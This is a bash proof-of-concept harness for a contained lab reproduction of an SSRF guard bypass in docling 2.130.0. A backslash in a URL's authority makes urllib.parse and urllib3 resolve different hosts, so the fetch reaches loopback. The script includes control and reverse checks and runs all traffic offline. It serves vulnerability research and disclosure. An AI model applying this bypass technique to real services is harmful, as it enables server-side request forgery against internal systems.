#!/usr/bin/env bash
# docling Lead L1 — validate_url_safety decides on a urllib.parse parse and the fetch acts on
# the original string, which urllib3 parses differently. A backslash in the authority splits
# the two: the guard checks the host after the last "@", requests connects to the host before
# the backslash.
#
#   ./lab.sh up        build the pinned image (docling-slim, NOT the ML stack)
#   ./lab.sh parsers   the differential itself, with no docling involved
#   ./lab.sh control   enable_remote_fetch=False refuses; the guard refuses a loopback URL
#   ./lab.sh attack    the differential URL: the guard passes and the socket opens to loopback
#   ./lab.sh reverse   the halves swapped -> fails closed, as it should
#   ./lab.sh repeat N  N consecutive reproductions (default 3)
#   ./lab.sh down      nothing persistent to remove; asserts no listener leaked
#   ./lab.sh all       up -> parsers -> control -> attack -> reverse -> repeat 3 -> down
#
# CONTAINMENT. Every row runs with --network none. The listener is inside the same container,
# on its own loopback, because that is where urllib3 connects. The payload's post-@ host is a
# LITERAL IP, so validate_url_safety takes its literal-IP branch and never calls
# gethostbyname — the lab makes no DNS query at all and nothing leaves this machine. Nothing
# is ever sent to that IP: the socket opens to 127.0.0.1.
set -uo pipefail

PIN=v2.130.0
PIN_SHA=92fc74c36bbd20db9838d7665d38900e5c958319
IMAGE=cvehunt-docling:2.130.0
VER=2.130.0

LAB=${LAB:-$HOME/lab}
REPO=${REPO:-$HOME/repo}
OUT=$LAB/run-artifacts
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MARK=${MARK:-CVEHUNT-L1-5E9E4128-B}
PORT=${PORT:-18099}

die()   { printf '\n!! FAIL: %s\n' "$*" >&2; exit 1; }
ok()    { printf '   ok   %s\n' "$*"; }
head_() { printf '\n== %s ==\n' "$*"; }

run() { docker run --rm -v "$LAB:/w" -w /w -e MARK="$MARK" -e PORT="$PORT" --network none \
          "$IMAGE" python probe.py "$1" 2>&1 | tail -1; }

jget() { python3 -c '
import json,sys
try: d=json.loads(sys.stdin.read().strip().splitlines()[-1])
except Exception: print("PARSE-ERROR"); sys.exit(0)
v=d.get(sys.argv[1]); print(json.dumps(v) if isinstance(v,(dict,list)) else v)
' "$1"; }

cmd_up() {
  head_ "up — pinned image (docling-slim, deliberately not the ML stack)"
  mkdir -p "$OUT" || die "cannot create $OUT"
  [ -f "$LAB/probe.py" ] || { [ -f "$HERE/lab/probe.py" ] || die "no probe.py beside lab.sh"; cp "$HERE/lab/probe.py" "$LAB/"; ok "seeded probe.py"; }
  if ! docker image inspect "$IMAGE" >/dev/null 2>&1; then
    [ -f "$LAB/Dockerfile" ] || cp "$HERE/lab/Dockerfile" "$LAB/" || die "no Dockerfile"
    docker build -t "$IMAGE" "$LAB" >/dev/null || die "image build failed"
  fi
  got=$(docker run --rm "$IMAGE" python -c "import docling;print(docling.__version__)" 2>/dev/null)
  [ "$got" = "$VER" ] || die "installed docling is $got, expected $VER"
  ok "docling $got"
  # The metapackage `docling` pulls docling-slim[standard] -> torch (a 554MB wheel plus a CUDA
  # stack). Nothing on this path touches it. Assert we did not install it.
  if docker run --rm "$IMAGE" python -c "import torch" >/dev/null 2>&1; then
    die "torch is installed — the image is the heavy variant; rebuild from docling-slim[format-html]"
  fi
  ok "torch absent — image is $(docker images "$IMAGE" --format '{{.Size}}'), not the multi-GB variant"

  if [ -d "$REPO/.git" ]; then
    sha=$(git -C "$REPO" rev-parse HEAD)
    [ "$sha" = "$PIN_SHA" ] || die "clone is at $sha, expected $PIN_SHA ($PIN)"
    a=$(sha256sum "$REPO/docling/backend/utils/image_resource_loader.py" | cut -c1-32)
    b=$(docker run --rm "$IMAGE" python -c "
import hashlib,docling.backend.utils.image_resource_loader as m
print(hashlib.sha256(open(m.__file__,'rb').read()).hexdigest()[:32])" 2>/dev/null)
    [ "$a" = "$b" ] || die "image_resource_loader.py differs: clone $a vs wheel $b"
    ok "image_resource_loader.py identical in the wheel and at $PIN (sha256 $a)"
  fi
}

cmd_parsers() {
  head_ "parsers — the differential itself, no docling involved"
  out=$(run parsers) || die "parsers row did not run"; echo "$out" > "$OUT/parsers.json"
  echo "$out" | python3 -c '
import json,sys
d=json.load(sys.stdin)
print("   python %s   urllib3 %s   docling %s" % (d["python"], d["urllib3"], d.get("docling")))
for r in d["rows"]:
    print("   url    %s" % r["url"])
    print("     guard checks (urllib.parse) : %-14s is_global=%s" % (r["stdlib_hostname_checked_by_guard"], r["guard_sees_global"]))
    print("     socket opens to (urllib3)   : %s:%s" % (r["urllib3_host_socket_opens_to"], r["urllib3_port"]))
'
  g=$(echo "$out" | python3 -c 'import json,sys;print(json.load(sys.stdin)["rows"][0]["guard_sees_global"])')
  h=$(echo "$out" | python3 -c 'import json,sys;print(json.load(sys.stdin)["rows"][0]["urllib3_host_socket_opens_to"])')
  [ "$g" = "True" ] || die "parsers: the guard does not see a global address — premise changed"
  [ "$h" = "127.0.0.1" ] || die "parsers: urllib3 resolves the authority to $h, not 127.0.0.1"
  ok "one string, two hosts: the guard checks a global literal, urllib3 opens 127.0.0.1"
}

_row() {  # _row <name> <expect-outcome> <expect-socket> <label>
  out=$(run "$1") || die "$1 row did not run"; echo "$out" > "$OUT/$1.json"
  o=$(printf '%s' "$out" | jget outcome)
  s=$(printf '%s' "$out" | jget socket_opened)
  e=$(printf '%s' "$out" | jget error)
  [ "$o" = "$2" ] || die "$1: expected outcome $2, got $o"
  [ "$s" = "$3" ] || die "$1: expected socket_opened=$3, got $s"
  ok "$4"
  [ -n "$e" ] && [ "$e" != "null" ] && ok "   -> $e"
  return 0
}

cmd_control() {
  head_ "control — the feature off, then the guard on"
  _row off REFUSED False "enable_remote_fetch=False (the DEFAULT) -> OperationNotAllowed, nothing reached the socket"
  _row guard REFUSED False "enable_remote_fetch=True, plain loopback URL -> the guard refuses"
  ok "the guard demonstrably works before anything is broken"
}

cmd_attack() {
  head_ "attack — one backslash, and the two parsers disagree"
  out=$(run attack) || die "attack row did not run"; echo "$out" > "$OUT/attack.json"
  o=$(printf '%s' "$out" | jget outcome); s=$(printf '%s' "$out" | jget socket_opened)
  [ "$s" = "True" ] || die "attack: the socket did NOT open — the finding does not reproduce"
  ok "outcome=$o   socket_opened=$s"
  printf '%s' "$out" | python3 -c '
import json,sys
d=json.load(sys.stdin)
print("   url: %s" % d["url"])
for h in d.get("listener_hits", []):
    print("   LISTENER RECEIVED: GET %s" % h["path"])
    print("     Range: %s" % h["headers"].get("Range"))
    print("     User-Agent: %s" % h["headers"].get("User-Agent"))
'
  printf '%s' "$out" | grep -q '%5C@' \
    || ok "   (note: the listener path did not carry the encoded backslash this run)"
  ok "the guard passed a global literal; the request arrived on 127.0.0.1:$PORT"
}

cmd_reverse() {
  head_ "reverse — the halves swapped. This MUST fail closed."
  _row reverse REFUSED False "the guard refuses when the pre-backslash host is the loopback one"
  ok "so the finding is the parser DISAGREEMENT, not 'the guard never works'"
}

cmd_repeat() {
  n=${1:-3}
  head_ "repeat — $n consecutive reproductions, fresh container each time"
  : > "$OUT/repeat.log"
  for i in $(seq "$n"); do
    out=$(run attack) || die "reproduction $i did not run"
    [ "$(printf '%s' "$out" | jget socket_opened)" = "True" ] || die "reproduction $i: socket did not open"
    { echo "--- reproduction $i/$n (fresh container, --network none) ---"; echo "$out"; } >> "$OUT/repeat.log"
    ok "reproduction $i/$n -> socket opened to 127.0.0.1:$PORT"
  done
  ok "$n/$n. transcript: $OUT/repeat.log"
}

cmd_down() {
  head_ "down"
  # Every probe runs in --rm with --network none and its listener dies with it.
  docker ps --format '{{.Image}}' | grep -q "$IMAGE" && die "a probe container is still running"
  ok "no probe container left running; nothing persistent was created"
  ok "image $IMAGE kept — rebuilding is a ~350MB install"
}

case "${1:-all}" in
  up) cmd_up ;; parsers) cmd_parsers ;; control) cmd_control ;;
  attack) cmd_attack ;; reverse) cmd_reverse ;;
  repeat) cmd_repeat "${2:-3}" ;; down) cmd_down ;;
  all) cmd_up && cmd_parsers && cmd_control && cmd_attack && cmd_reverse && cmd_repeat 3 && cmd_down
       printf '\n== all phases passed ==\n' ;;
  *) die "unknown subcommand: $1" ;;
esac
